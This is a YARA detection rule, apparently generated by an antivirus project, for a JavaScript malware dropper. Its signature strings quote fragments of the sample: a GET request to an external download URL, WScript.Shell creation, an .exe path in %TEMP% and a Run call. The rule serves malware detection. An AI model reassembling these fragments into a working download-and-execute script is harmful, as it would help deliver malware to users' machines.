rule sig_20160330_c5357b9509400f69e9da49f72c588bbf {
  meta:
    description = "datamaliciousorder - file 20160330_c5357b9509400f69e9da49f72c588bbf.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d2732f6ca7bc9cfedb09d4e74cf9a79ef063b4617b2ce87af959055fa257c2ec"

  strings:
    $s1  = "Z0[U](\"GET\", \"http://ekotrade.pl/m4ujda\", false);" fullword ascii
    $s2  = "var TN = function QI() {return WScript[O](\"WScript\"+\".Shell\");}(), KV = 11;" fullword ascii
    $s3  = "function RM(WG, A){W = W * 1; return WG - A;};" fullword ascii
    $s4  = "if (Z0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function T() {return TN[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"5QENfnIX.ex\" + \"e\";};" fullword ascii
    $s6  = "function OB(){return V + \"\";};" fullword ascii
    $s7  = "function B() {return ((WW == true) && (WW == TX)) ? 1 : W;};" fullword ascii
    $s8  = "function D(UJ){TN[\"Run\"](UJ, W, W);};" fullword ascii
    $s9  = "function Z()" fullword ascii
    $s10 = "var XT = new this[\"Date\"]();" fullword ascii
    $s11 = "function DO(){return O;};" fullword ascii
    $s12 = "return RM(B0, M);" fullword ascii
    $s13 = "function Y(RH) {var H = (1, 2, 3, 4, 5, RH); return H;};" fullword ascii
    $s14 = "}while (D0);" fullword ascii
    $s15 = "function MS(){return 22;};" fullword ascii
    $s16 = "var WW = false;" fullword ascii
    $s17 = "var TX = false;" fullword ascii
    $s18 = "var V0 = false;" fullword ascii
    $s19 = "TX = true; " fullword ascii
    $s20 = "WW = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}